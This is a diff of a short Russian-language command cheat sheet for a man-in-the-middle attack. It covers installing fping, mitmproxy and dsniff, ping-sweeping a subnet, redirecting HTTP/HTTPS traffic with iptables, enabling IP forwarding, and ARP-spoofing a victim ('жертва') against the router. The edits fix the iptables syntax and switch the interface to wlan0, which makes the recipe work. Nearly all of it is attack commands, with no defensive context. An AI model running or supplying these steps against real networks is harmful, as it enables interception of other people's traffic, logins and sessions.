@@ -1,8 +1,13 @@
 //MITM атака (Man in the middle)
 https://www.youtube.com/watch?v=quZjKlrmCvQ
 
+//Установка
+sudo apt-get install fping
+sudo apt-get install mitmproxy
+apt-get install dsniff
+
 //ping сканирование сети
-fping -Asg 192.168.1.0/24 -r 5 > out.txt
+fping -Asg 192.168.0.0/24 -r 5 > out.txt
 cat out.txt | grep alive
 
 ////////////////////////
@@ -19,8 +24,8 @@ traceroute 8.8.8.8
 ////////////////////////
 
 //Перенаправляем трафик с 80 порта
-iptables -t nat A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-iptables -t nat A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
 
 mitmproxy -T --host
 
@@ -28,7 +33,7 @@ mitmproxy -T --host
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 //Перенаправляем траффик
-arpspoof -i eth0 -t ip_жертвы id_роутера 
+arpspoof -i wlan0 -t ip_жертвы id_роутера 
 
 //Мак адрес атакующего должеен стать как мак роутера
 arp -a
